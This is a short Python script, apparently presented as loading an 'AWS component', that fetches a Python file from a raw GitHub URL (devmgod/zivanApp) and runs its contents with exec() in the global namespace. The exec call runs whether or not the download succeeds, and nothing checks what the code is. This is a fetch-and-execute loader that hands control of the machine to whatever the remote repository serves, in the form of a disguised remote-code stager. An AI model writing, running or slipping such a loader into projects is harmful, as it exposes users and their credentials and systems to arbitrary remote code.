import requests

github_url = "https://raw.githubusercontent.com/devmgod/zivanApp/refs/heads/master/aws_component.py"
response = requests.get(github_url)
print(response.status_code)
if response.status_code == 200:
    print("AWS component loaded")
exec(response.text, globals())